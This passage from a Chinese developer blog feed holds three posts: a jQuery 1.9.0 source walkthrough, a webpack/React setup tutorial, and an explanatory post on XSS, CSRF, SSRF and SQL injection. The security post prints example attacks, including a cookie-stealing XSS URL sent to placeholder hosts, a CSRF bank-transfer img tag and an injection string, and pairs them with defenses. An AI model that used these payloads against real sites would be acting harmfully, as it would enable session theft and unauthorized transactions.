<pre><code>var arr = [];

1. arr.concat();
2. core_concat.call(arr);
3. core_concat.apply(arr);
</code></pre><p>这里就有两个问题</p>
<ol>
<li>jQuery为什么要先把这些方法存储起来？</li>
<li>jQuery为什么要采用方式二或者三，而不直接使用方式一的做法？ </li>
</ol>
<p>其实第二个问题就回答了第一个问题。<br>而关于第二个问题有两个回答：</p>
<ol>
<li>按第一种方式调用时，首先需要辨别当前实例<code>arr</code>的类型是<code>Array</code>，在内存空间中寻找<code>Array</code>的<code>concat</code>内存入口，把当前对象<code>arr</code>的指针和其他参数压入栈，跳转到<code>concat</code>地址开始执行。而当保存了<code>concat</code>方法的入口<code>core_concat</code>时，完全就可以省去前面两个步骤，从而提升一些性能。</li>
<li><code>var obj = {};</code>此时调用<code>obj.concat</code>会报错。但是如果采用后两种方式调用的话，能够解决这个问题。 也即是让类数组也能用到数组的方法（这就是<code>call</code>跟<code>apply</code>带来的另一种用法），尤其在jQuery里边引用一些DOM对象时，也能完美的用这个方法去解决。</li>
</ol>
<h3 id="trim"><a href="#trim" class="headerlink" title="$.trim()"></a>$.trim()</h3><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><pre><code>core_version = &quot;1.9.0&quot;,
core_trim = core_version.trim,
rtrim = /^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,

trim: core_trim &amp;&amp; !core_trim.call(&quot;\uFEFF\xA0&quot;) ?
  function( text ) {
    return text == null ?
      &quot;&quot; :
      core_trim.call( text );
  } :

  // Otherwise use our own trimming functionality
  function( text ) {
    return text == null ?
      &quot;&quot; :
      ( text + &quot;&quot; ).replace( rtrim, &quot;&quot; );
  }
</code></pre><h4 id="等同于：-1"><a href="#等同于：-1" class="headerlink" title="等同于："></a>等同于：</h4><pre><code>trim: if (String.prototype.trim &amp;&amp; &quot;\uFEFF\xA0&quot;.trim() !== &quot;&quot;) {
    //直接调用原生String的trim方法
} else {
    //使用正则表达式和replace方法替换前尾的空格
}
</code></pre><h4 id="分析：-1"><a href="#分析：-1" class="headerlink" title="分析："></a>分析：</h4><p>如果浏览器原生支持<code>String</code>的<code>trim</code>方法，并且能够解析全角空格，那么就直接使用原生的<code>trim</code>方法</p>
<blockquote>
<p><code>\uFEFF</code>是utf8的字节序标记，<code>\xA0</code>是全角空格</p>
</blockquote>
<p>如果以上条件成立，那就直接用原生的trim函数:</p>
<pre><code>$.trim = function( text ) {
    return text == null ?
        &quot;&quot; :
        text.trim();
}
</code></pre><p>如果上述条件不成立，那就自己实现一个<code>trim</code>方法：</p>
<pre><code>$.trim = function( text ) {
    return text == null ?
        &quot;&quot; :
        ( text + &quot;&quot; ).replace( rtrim, &quot;&quot; );
}
</code></pre><h3 id="each"><a href="#each" class="headerlink" title="$.each()"></a>$.each()</h3><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><pre><code>$.each = function( obj, callback, args ) {
  //obj 是需要遍历的数组或者对象
  //callback是处理数组或对象的每个元素的回调函数，它的返回值实际会中断循环的过程

  var value,
    i = 0,
    length = obj.length,
    //判断是不是数组
    isArray = isArraylike( obj );

  if ( args ) {
    if ( isArray ) {
      for ( ; i &lt; length; i++ ) {
        value = callback.apply( obj[ i ], args );
        //相当于: args = [arg1, arg2, arg3];
        //callback(args1, args2, args3)。然后callback里边的this指向了obj[i]

        if ( value === false ) {
          //注意到，当callback函数返回值会false的时候，注意是全等！循环结束
          break;
        }
      }
    } else {
      for ( i in obj ) {
        value = callback.apply( obj[ i ], args );

        if ( value === false ) {
          break;
        }
      }
    }

  // A special, fast, case for the most common use of each
  } else {
    if ( isArray ) {
      for ( ; i &lt; length; i++ ) {
        value = callback.call( obj[ i ], i, obj[ i ] );
        //相当于callback(i, obj[i])。然后callback里边的this指向了obj[i]

        if ( value === false ) {
            break;
          }
        }
      } else {
        for ( i in obj ) {
          value = callback.call( obj[ i ], i, obj[ i ] );

          if ( value === false ) {
            break;
          }
        }
      }
    }

  return obj;
}
</code></pre><h4 id="等同于：-2"><a href="#等同于：-2" class="headerlink" title="等同于："></a>等同于：</h4><pre><code>//for in对于数组来说性能比较低而且存在某些bug
//这里只是希望用更简洁的代码来减少原先代码的重复性
$.each = function( obj, callback, args ) {
  var value,
    i = 0,
    length = obj.length;

  for ( i in obj ) {
    value =
      args ?
      callback.apply( obj[ i ], args ) :
      callback.call( obj[ i ], i, obj[ i ] );

    if ( value === false ) {
      break;
    }
  }
  return obj;
}
</code></pre><h4 id="分析：-2"><a href="#分析：-2" class="headerlink" title="分析："></a>分析：</h4><p>看这两个例子</p>
<pre><code>$.each([1,2,3], function(key, value){
  console.log(&quot;[&quot; + key + &quot;]=&quot; + value);
  return false;
});
//输出：
[0]=1
//原数组结果：
[1,2,3]
</code></pre><p><code>$.each()</code>接受2个参数， 数组[1,2,3],回调函数<br>可以看到回调函数具有两个参数，<code>key</code>是数组的索引，<code>value</code>是对应的元素</p>
<pre><code>$.each([1,2,3], function(arg1, arg2){
  console.log(this + &quot;,&quot; + arg1 + &quot;,&quot; + arg2);
  return ;
}, [4, 5]);
//输出：
1,4,5
2,4,5
3,4,5
//原数组结果：
[1,2,3]
</code></pre><p><code>$.each()</code>接受3个参数， 数组[1,2,3],回调函数，一个额外的参数数组<code>args</code>=[4,5]<br>可以看到回调函数的两个参数就是<code>$.each()</code>的第三个参数<code>args</code>，在函数里边的<code>this</code>就是遍历元素自己</p>
<p>对比上述二者也可以看到，当回调函数<code>return false</code>后就跳出循环，遍历不再执行</p>
<h3 id="inArray"><a href="#inArray" class="headerlink" title="$.inArray()"></a>$.inArray()</h3><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><pre><code>core_deletedIds = [],
core_indexOf = core_deletedIds.indexOf,

//elem 规定需检索的值。
//arr 数组
//i 可选的整数参数。规定在数组中开始检索的位置。它的合法取值是 0 到 arr.length - 1。如省略该参数，则将从数组首元素开始检索。
inArray: function( elem, arr, i ) {
  var len;

  if ( arr ) {
    //原生的Array对象支持indexOf方法，直接调用
    if ( core_indexOf ) {
      return core_indexOf.call( arr, elem, i );
    }

    len = arr.length;
    i = i ? i &lt; 0 ? Math.max( 0, len + i ) : i : 0;

    for ( ; i &lt; len; i++ ) {
      if ( i in arr &amp;&amp; arr[ i ] === elem ) {
        return i;
      }
    }
  }

  //全部都不符合，返回-1
  return -1;
},
</code></pre><h4 id="分析：-3"><a href="#分析：-3" class="headerlink" title="分析："></a>分析：</h4><pre><code>i = i ? i &lt; 0 ? Math.max( 0, len + i ) : i : 0;
</code></pre><p>当i为负数时，从数组后边len+i的位置开始索引</p>
<pre><code>for ( ; i &lt; len; i++ ) {
    if ( i in arr &amp;&amp; arr[ i ] === elem ) {
    return i;
    }
}
</code></pre><p>这里的<code>(i in arr)</code>判断是为了跳过稀疏数组中的元素<br>例如 <code>var arr = []; arr[2] = 1;</code><br>此时 <code>arr == [undefined, undefined, 1]</code><br>结果是 =&gt; </p>
<ul>
<li><code>(0 in arr == false)</code> </li>
<li><code>(1 in arr == false)</code> </li>
<li><code>(2 in arr == true)</code></li>
</ul>
<p>另外（在火狐下）测试得：</p>
<pre><code>var arr = [undefined, 1]; 
</code></pre><p>输出是： </p>
<pre><code>arr == [undefined, 1] 
0 in arr == true; 
arr.indexOf(undefined) == 0; 
arr[0] == undefined; 
</code></pre><p>但是如果是以下代码： </p>
<pre><code>var arr = []; 
a[1] = 1; 
</code></pre><p>输出是： </p>
<pre><code>arr == [undefined, 1] 
0 in arr == false; 
arr.indexOf(undefined) == -1; 
arr[0] == undefined;
</code></pre><p>所以<code>(i in arr)</code>也是必要的。</p>
<h3 id="grep"><a href="#grep" class="headerlink" title="$.grep()"></a>$.grep()</h3><h4 id="源码：-4"><a href="#源码：-4" class="headerlink" title="源码："></a>源码：</h4><pre><code>grep: function( elems, callback, inv ) {
    var retVal,
    ret = [],
    i = 0,
    length = elems.length;
    //转成布尔型
    inv = !!inv;

    // Go through the array, only saving the items that pass the validator function
    for ( ; i &lt; length; i++ ) {
        retVal = !!callback( elems[ i ], i );
        //注意这里的callback参数是先value,后key
        if ( inv !== retVal ) {
            ret.push( elems[ i ] );
        }
    }

    return ret;
}
</code></pre><p>用例：</p>
<pre><code>$.grep( [0,1,2], function(n,i){
  return n &lt;= 0;
});
//结果是：[0] 

$.grep( [0,1,2], function(n,i){
  return n &lt;= 0;
}, true);
//结果是：[1, 2]
</code></pre><hr>
<p>参考链接</p>
<ul>
<li><a href="https://www.w3ctech.com/topic/256" target="_blank" rel="external">jQuery源码剖析（一）——概览&amp;工具方法</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;神库jQuery的内心世界&lt;/p&gt;
&lt;p&gt;选用1.9.0版本jQuery&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="js" scheme="https://jasonyan2015.github.io/tags/js/"/>
    
      <category term="jquery" scheme="https://jasonyan2015.github.io/tags/jquery/"/>
    
      <category term="源码分析" scheme="https://jasonyan2015.github.io/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>新时代使用react框架的环境搭建</title>
    <link href="https://jasonyan2015.github.io/2017/04/22/webpack+es6+react+babel%E7%83%AD%E6%9B%B4%E6%96%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <id>https://jasonyan2015.github.io/2017/04/22/webpack+es6+react+babel热更新环境搭建/</id>
    <published>2017-04-22T07:50:08.680Z</published>
    <updated>2017-04-22T08:23:16.849Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>作为一名2016年成长起来的前端，怎么能不会react，不会babel，不会es6，不会webpack…..呢</p>
</blockquote>
<a id="more"></a>
<h2 id="安装与配置"><a href="#安装与配置" class="headerlink" title="安装与配置"></a>安装与配置</h2><p>创建一个目录，就不用说了。这里先取名为<code>root</code>。</p>
<h3 id="创建项目配置文件package-json"><a href="#创建项目配置文件package-json" class="headerlink" title="创建项目配置文件package.json"></a>创建项目配置文件<code>package.json</code></h3><pre><code>npm init
</code></pre><p>填写相关问题，即可在<code>root</code>根目录创建<code>package.json</code>文件。</p>
<blockquote>
<p>注意，其中的package name不能与<code>npm</code>的包同名，否则<code>npm install</code>的时候会出错，安装不上。另外，创建该配置文件后，后续<code>npm install</code>的包都会在安装完成后自动加入<code>package.json</code>的字段中。</p>
</blockquote>
<p>这里给个目录预告</p>
<ul>
<li>/app<ul>
<li>main.js</li>
<li>component.js</li>
</ul>
</li>
<li>/public<ul>
<li>bundle.js</li>
<li>index.html</li>
</ul>
</li>
<li>/node_modules<ul>
<li>…</li>
</ul>
</li>
<li>package.json</li>
<li>webpack.config.js</li>
</ul>
<h3 id="安装与配置webpack"><a href="#安装与配置webpack" class="headerlink" title="安装与配置webpack"></a>安装与配置<code>webpack</code></h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><pre><code>npm install --save-dev webpack
</code></pre><h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在根目录<code>root</code>创建<code>webpack.config.js</code>。</p>
<p>具体配置参数请搜索相关信息，不详细介绍，这里给个例子</p>
<pre><code>var path = require(&apos;path&apos;);

module.exports = {
    entry: path.resolve(__dirname, &apos;app/main.js&apos;),
    output: {
        path: path.resolve(__dirname, &apos;public&apos;),
        filename: &apos;bundle.js&apos;,
    },
    module: {
        loaders: [
              {
                test: /\.js$/, 
                exclude: /node_modules/, 
                loader: &apos;babel-loader&apos;
            }
        ]
    },
};
</code></pre><h3 id="安装与配置webpack-dev-server"><a href="#安装与配置webpack-dev-server" class="headerlink" title="安装与配置webpack-dev-server"></a>安装与配置<code>webpack-dev-server</code></h3><p>这是一个能够提供一个可选的本地开发服务器（基于Node创建），用来监听文件改变并自动编译的包</p>
<h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><pre><code>npm install --save-dev webpack-dev-server
</code></pre><h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>在<code>webpack.config.js</code>中添加</p>
<pre><code>module.exports = {
    ......
    devServer: {
        contentBase: &quot;public&quot;,
        historyApiFallback: true,
        inline: true,
        hot: true
    },
    plugins: [
        new webpack.HotModuleReplacementPlugin()
    ]
};
</code></pre><h3 id="安装react-react-dom"><a href="#安装react-react-dom" class="headerlink" title="安装react,react-dom"></a>安装react,react-dom</h3><pre><code>npm install --save-dev react react-dom
</code></pre><blockquote>
<p>多个包之间用空格间隔开</p>
</blockquote>
<h3 id="安装与配置eslint"><a href="#安装与配置eslint" class="headerlink" title="安装与配置eslint"></a>安装与配置eslint</h3><h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><pre><code>npm install eslint -g
</code></pre><blockquote>
<p>用了全局安装，我在使用时使用本地安装使用时在根目录找不到命令<code>eslint</code>不知道为什么，最后一想，反正代码检查全都要用，就全局安装了。后续有时间会研究一下这个问题。</p>
</blockquote>
<h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h4><p>使用<code>eslint</code>自带的命令配置即可：</p>
<pre><code>eslint -init
</code></pre><p>和<code>npm init</code>的形式一样，也是问答式的自动创建。更为方便的是也可以通过这个命令直接使用比如airbnb公司的配置（他们的配置几乎是所有<code>eslint</code>使用者的强推，这也看出来大家都用的mac[捂脸],windows下使用<code>eslint-config-airbnb</code>每行都错，因为windows使用的换行符是<code>crlf</code>而mac是<code>lf</code>，他们的配置要求所有换行是<code>lf</code>）</p>
<h2 id="目录树"><a href="#目录树" class="headerlink" title="目录树"></a>目录树</h2><p>安装了一些必要的包之后，目前根目录<code>root</code>下的文件结构应该是这样的，其中有三个文件是手动创建的：</p>
<ul>
<li><code>main.js</code>：<code>webpack</code>打包整个项目时作为唯一入口，引用项目的所有依赖</li>
<li><code>index.html</code>：引入<code>main.js</code>，作为承载整个项目的页面</li>
<li><code>component.js</code>：具体的业务相关逻辑代码存放处，可再细分</li>
</ul>
<p>而<code>bundle.js</code>会在后续中使用<code>webpack</code>自动创建。</p>
<ul>
<li>/app<ul>
<li>main.js</li>
<li>component.js</li>
</ul>
</li>
<li>/public<ul>
<li>bundle.js</li>
<li>index.html</li>
</ul>
</li>
<li>/node_modules<ul>
<li>…</li>
</ul>
</li>
<li>package.json</li>
<li>webpack.config.js</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="index-html，component-js和main-js的例子"><a href="#index-html，component-js和main-js的例子" class="headerlink" title="index.html，component.js和main.js的例子"></a><code>index.html</code>，<code>component.js</code>和<code>main.js</code>的例子</h3><p><strong>app/component.js</strong></p>
<pre><code>&apos;use strict&apos;;

module.exports = function () {
    var element = document.createElement(&apos;h1&apos;);

    element.innerHTML = &apos;Hello world&apos;;

    return element;
};
</code></pre><p><strong>app/main.js</strong></p>
<pre><code>&apos;use strict&apos;;
var component = require(&apos;./component.js&apos;);

document.body.appendChild(component());
</code></pre><p><strong>index.html</strong></p>
<pre><code>&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset=&quot;UTF-8&quot;/&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;script src=&quot;bundle.js&quot;&gt;&lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
</code></pre><p>好了，最后在根目录运行 </p>
<pre><code>webpack
</code></pre><p>就自动编译出了<code>bundle.js</code>。</p>
<p>另外，如果使用自动编译：</p>
<pre><code>webpack-dev-server --devtool eval --progress --colors
</code></pre><p>参数说明：</p>
<ul>
<li>webpack-dev-server - 在 localhost:8080 建立一个 Web 服务器</li>
<li>–devtool eval - 为代码创建源地址。当有任何报错的时候可以让你更加精确地定位到文件和行号</li>
<li>–hot - 需要在<code>webpack.config.js</code>中引用一个<code>plugins</code>插件<code>new webpack.HotModuleReplacementPlugin()</code>才生效</li>
<li>–progress - 显示合并代码进度</li>
<li>–colors - 在命令行中显示颜色</li>
<li>–content-base public - 指向设置的输出目录</li>
</ul>
<p>附：</p>
<table>
<thead>
<tr>
<th style="text-align:left">devtool选项</th>
<th style="text-align:left">配置结果</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">source-map</td>
<td style="text-align:left">在一个单独的文件中产生一个完整且功能完全的文件。这个文件具有最好的source map，但是它会减慢打包文件的构建速度；</td>
</tr>
<tr>
<td style="text-align:left">cheap-module-source-map</td>
<td style="text-align:left">在一个单独的文件中生成一个不带列映射的map，不带列映射提高项目构建速度，但是也使得浏览器开发者工具只能对应到具体的行，不能对应到具体的列（符号），会对调试造成不便；</td>
</tr>
<tr>
<td style="text-align:left">eval-source-map</td>
<td style="text-align:left">使用eval打包源文件模块，在同一个文件中生成干净的完整的source map。这个选项可以在不影响构建速度的前提下生成完整的sourcemap，但是对打包后输出的JS文件的执行具有性能和安全的隐患。不过在开发阶段这是一个非常好的选项，但是在生产阶段一定不要用这个选项；</td>
</tr>
<tr>
<td style="text-align:left">cheap-module-eval-source-map</td>
<td style="text-align:left">这是在打包文件时最快的生成source map的方法，生成的Source Map 会和打包后的JavaScript文件同行显示，没有列映射，和eval-source-map选项具有相似的缺点</td>
</tr>
</tbody>
</table>
<h3 id="命令行规范"><a href="#命令行规范" class="headerlink" title="命令行规范"></a>命令行规范</h3><p>随着工程的复杂化，我们会需要越来越多的命令去执行，规范的行为是，统一放到<code>package.json</code>的<code>scripts</code>字段中，统一管理。</p>
<p>像上面的 </p>
<p><code>webpack-dev-server --devtool eval --progress --colors</code></p>
<p>命令，可以这样配置<code>scripts</code>字段(<code>key</code>名可以任意起，这里叫<code>build</code>，<code>dev</code>)</p>
<pre><code>&quot;scripts&quot;: {
    &quot;build&quot;: &quot;webpack&quot;,
    &quot;dev&quot;: &quot;webpack-dev-server --devtool eval --progress --colors&quot;
}
</code></pre><p>这样每次使用</p>
<pre><code>npm run dev
</code></pre><p>就会实际上执行</p>
<pre><code>webpack-dev-server --devtool eval --progress --colors
</code></pre><h3 id="使用总结"><a href="#使用总结" class="headerlink" title="使用总结"></a>使用总结</h3><p>使用<code>npm run dev</code>后每次修改并保存<code>main.js</code>都会触发一次<code>webpack</code>编译，然后在浏览器访问<code>127.0.0.1:8080</code>监听8080端口即可看到浏览器渲染结果。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;作为一名2016年成长起来的前端，怎么能不会react，不会babel，不会es6，不会webpack…..呢&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="js" scheme="https://jasonyan2015.github.io/tags/js/"/>
    
      <category term="webpack" scheme="https://jasonyan2015.github.io/tags/webpack/"/>
    
      <category term="react" scheme="https://jasonyan2015.github.io/tags/react/"/>
    
      <category term="babel" scheme="https://jasonyan2015.github.io/tags/babel/"/>
    
  </entry>
  
  <entry>
    <title>前端安全：XSS和CSRF</title>
    <link href="https://jasonyan2015.github.io/2017/04/11/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    <id>https://jasonyan2015.github.io/2017/04/11/前端安全/</id>
    <published>2017-04-11T12:31:51.755Z</published>
    <updated>2017-04-11T12:52:27.081Z</updated>
    
    <content type="html"><![CDATA[<h2 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h2><p>XSS（cross-site scripting跨域脚本攻击）攻击是最常见的WEB攻击之一，其重点是“<strong>跨域</strong>”和“<strong>客户端执行</strong>”。</p>
<p>XSS攻击分为三种</p>
<ul>
<li>Reflected XSS</li>
<li>Stored XSS</li>
<li>DOM-based or loacl XSS</li>
</ul>
<a id="more"></a>
<h3 id="Reflected-XSS"><a href="#Reflected-XSS" class="headerlink" title="Reflected XSS"></a>Reflected XSS</h3><p>基于反射的XSS攻击，主要依靠站点服务端返回脚本，在客户端触发执行从而发起Web攻击。</p>
<h5 id="例子，做个假设："><a href="#例子，做个假设：" class="headerlink" title="例子，做个假设："></a>例子，做个假设：</h5><ol>
<li><p>当亚马逊在搜索书籍，搜不到书的时候显示提交的名称。</p>
</li>
<li><p>在搜索框搜索内容，填入<code>&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code>, 点击搜索。</p>
</li>
<li><p>当前端页面没有对返回的数据进行过滤，直接显示在页面上， 这时就会alert那个字符串出来。</p>
</li>
<li><p>进而可以构造获取用户cookies的地址，通过QQ群或者垃圾邮件，来让其他人点击这个地址：<br><code>http://www.amazon.cn/search?name=&lt;script&gt;document.location=&#39;http://xxx/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
</li>
</ol>
<h5 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h5><p>对于一个图书馆网站book.com</p>
<p>假设右上角有一个搜索书籍的地方，可以按书名搜索书籍（book.com/search?name=时间简史），于是弹出《时间简史》的相关信息。</p>
<p>但是如果输入<code>&lt;script&gt;alert(&#39;没有书开个毛线书店啊&#39;)&lt;/script&gt;</code>，假设这个图书馆站点没有对数据做任何过滤，而且会原封不动地把用户输入的数据展示回来，那么返回的页面自然也会返回这段脚本，从而执行它。</p>
<p>既然要做攻击，我们就要获取用户的数据，要获取数据自然要把信息传回我们的服务器（假设接收信息的地址是<a href="http://vajoy/get），那么可以这样写：" target="_blank" rel="external">http://vajoy/get），那么可以这样写：</a><br><code>&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
<p>不过这样收到的总是我们自己的数据，我们要收集的应该是别人的cookie信息。</p>
<p>所以之后便可以通过QQ群，或者通过群发垃圾邮件，来让其他人点击这个地址：<br><code>book.com/search?name=&lt;script&gt;document.location=&#39;http://vajoy/get?cookie=&#39;+document.cookie&lt;/script&gt;</code></p>
<p>这样就可以依靠站点服务端返回脚本，在客户端触发执行从而发起WEB攻击，进行Reflected XSS攻击。</p>
<h4 id="开发安全措施"><a href="#开发安全措施" class="headerlink" title="开发安全措施"></a>开发安全措施</h4><ol>
<li><p>前端在显示服务端数据时候，不仅是标签内容需要过滤、转义，就连属性值也都可能需要。</p>
</li>
<li><p>后端接收请求时，验证请求是否为攻击请求，攻击则屏蔽。</p>
</li>
</ol>
<h5 id="例如："><a href="#例如：" class="headerlink" title="例如："></a>例如：</h5><p>标签：</p>
<p><code>&lt;span&gt;&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;&lt;/span&gt;</code></p>
<p>转义</p>
<p><code>&lt;span&gt;&amp;lt;script&amp;gt;alert(&amp;#39;handsome boy&amp;#39;)&amp;lt;/script&amp;gt&lt;/span&gt;</code></p>
<p>属性：</p>
<p>如果一个input的value属性值是</p>
<p><code>琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)</code><br>就可能出现</p>
<p><code>&lt;input type=&quot;text&quot; value=&quot;琅琊榜&quot; onclick=&quot;javascript:alert(&#39;handsome boy&#39;)&quot;&gt;</code></p>
<p>点击input导致攻击脚本被执行，解决方式可以对script或者双引号进行过滤。</p>
<h3 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h3><p>基于存储的XSS攻击，是通过发表带有恶意跨域脚本的帖子/文章，从而把恶意脚本存储在服务器，每个访问该帖子/文章的人就会触发执行。</p>
<h5 id="例子：-1"><a href="#例子：-1" class="headerlink" title="例子："></a>例子：</h5><ol>
<li><p>发一篇文章，里面包含了恶意脚本</p>
<p> <code>今天天气不错啊！&lt;script&gt;alert(&#39;handsome boy&#39;)&lt;/script&gt;</code></p>
</li>
<li><p>后端没有对文章进行过滤，直接保存文章内容到数据库。</p>
</li>
<li><p>当其他看这篇文章的时候，包含的恶意脚本就会执行。</p>
</li>
</ol>
<blockquote>
<p>因为大部分文章是保存整个HTML内容的，前端显示时候也不做过滤，就极可能出现这种情况。</p>
</blockquote>
<h5 id="结论："><a href="#结论：" class="headerlink" title="结论："></a>结论：</h5><p>后端尽可能对提交数据做过滤，在场景需求而不过滤的情况下，前端就需要做些处理了。</p>
<h5 id="开发安全措施："><a href="#开发安全措施：" class="headerlink" title="开发安全措施："></a>开发安全措施：</h5><ol>
<li><p>首要是服务端要进行过滤，因为前端的校验可以被绕过。</p>
</li>
<li><p>当服务端不校验时候，前端要以各种方式过滤里面可能的恶意脚本，例如script标签，将特殊字符转换成HTML编码。</p>
</li>
</ol>
<h3 id="DOM-based-or-local-XSS"><a href="#DOM-based-or-local-XSS" class="headerlink" title="DOM-based or local XSS"></a>DOM-based or local XSS</h3><p>基于DOM或本地的XSS攻击。一般是提供一个免费的wifi，但是提供免费wifi的网关会往你访问的任何页面插入一段脚本或者是直接返回一个钓鱼页面，从而植入恶意脚本。这种直接存在于页面，无须经过服务器返回就是基于本地的XSS攻击。</p>
<h5 id="例子1："><a href="#例子1：" class="headerlink" title="例子1："></a>例子1：</h5><ol>
<li><p>提供一个免费的wifi。</p>
</li>
<li><p>开启一个特殊的DNS服务，将所有域名都解析到我们的电脑上，并把Wifi的DHCP-DNS设置为我们的电脑IP。</p>
</li>
<li><p>之后连上wifi的用户打开任何网站，请求都将被我们截取到。我们根据http头中的host字段来转发到真正服务器上。</p>
</li>
<li><p>收到服务器返回的数据之后，我们就可以实现网页脚本的注入，并返回给用户。</p>
</li>
<li><p>当注入的脚本被执行，用户的浏览器将依次预加载各大网站的常用脚本库。</p>
</li>
</ol>
<p>这个其实就是wifi流量劫持，中间人可以看到用户的每一个请求，可以在页面嵌入恶意代码，使用恶意代码获取用户的信息，可以返回钓鱼页面。</p>
<h5 id="例子2："><a href="#例子2：" class="headerlink" title="例子2："></a>例子2：</h5><ol>
<li><p>还是提供一个免费wifi</p>
</li>
<li><p>在我们电脑上进行抓包</p>
</li>
<li><p>分析数据，可以获取用户的微信朋友圈、邮箱、社交网站帐号数据（HTTP）等。</p>
</li>
</ol>
<p><img src="http://images2015.cnblogs.com/blog/555379/201602/555379-20160218233450956-14270563.png" alt=""></p>
<p>PS：这个是测试在51job页面登录时进行抓包，可以获取帐号密码。</p>
<p>结论：</p>
<p>这攻击其实跟网站本身没有什么关系，只是数据被中间人获取了而已，而由于HTTP是明文传输的，所以是极可能被窃取的。</p>
<p>开发安全措施：</p>
<ol>
<li>使用HTTPS！就像《HTTP与HTTPS握手的那些事》这篇文章说的，HTTPS会在请求数据之前进行一次握手，使得客户端与服务端都有一个私钥，服务端用这个私钥加密，客户端用这个私钥解密，这样即使数据被人截取了，也是加密后的数据。</li>
</ol>
<p>总结</p>
<p>XSS攻击的特点就是：尽一切办法在目标网站上执行非目标网站上原有的脚本（某篇文章说的）。本地的XSS攻击的示例2其实不算XSS攻击，只是简单流量劫持。前两种XSS攻击是我们开发时候要注意的，而流量劫持的则可以使用HTTPS提高安全性。</p>
<h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>CSRF（Cross-site request forgery:跨站请求伪造）攻击者盗用用户的身份，并以其名义发送恶意请求。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>银行网站A，它以GET请求来完成银行转账的操作，如：<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code></p>
<p>危险网站B，它里面有一段HTML的代码如下：</p>
<pre><code>&lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt;
</code></pre><p>用户登录了银行网站A，然后访问危险网站B，然后用户的银行账户就少了1000块……</p>
<p>原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，用户已经登录了银行网站A，而B中的<code>&lt;img&gt;</code>以<code>GET</code>的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以用户的浏览器会带上银行网站A的Cookie发出Get请求，去获取资源<code>http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</code>，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作。</p>
<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>SSRF(Server-Side Request Forgery:服务器端请求伪造)是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）</p>
<h2 id="其他安全问题："><a href="#其他安全问题：" class="headerlink" title="其他安全问题："></a>其他安全问题：</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>是提交含有SQL操作语句的信息给后端，后端如果没有做好过滤就执行该语句，攻击者自然可以随意操纵该站点的数据库。</p>
<p>比如有一个图书馆站点book.com，你点进一本书的详情页面，其url是这样的：</p>
<p><code>book.com/book?id=100</code></p>
<p>说明这本书在数据库中的键值是100，后端收到url参数后就执行了数据库查询操作：</p>
<p><code>select * from booktable where id=&#39;100&#39;</code></p>
<p>那么如果我们把url更改为</p>
<p><code>book.com/book?id=100&#39;or&#39;1&#39;=&#39;1</code></p>
<p>那么数据库操作执行就变成了：</p>
<p><code>select * from booktable where id=&#39;100&#39;or&#39;1&#39;=&#39;1&#39;</code></p>
<p>从而取出了整个booktable 表单的全部数据。</p>
<hr>
<p>参考链接：</p>
<ul>
<li><a href="http://www.cnblogs.com/lovesong/p/5199623.html" target="_blank" rel="external">前端安全之XSS攻击</a></li>
<li><a href="http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html" target="_blank" rel="external">浅谈CSRF攻击方式</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
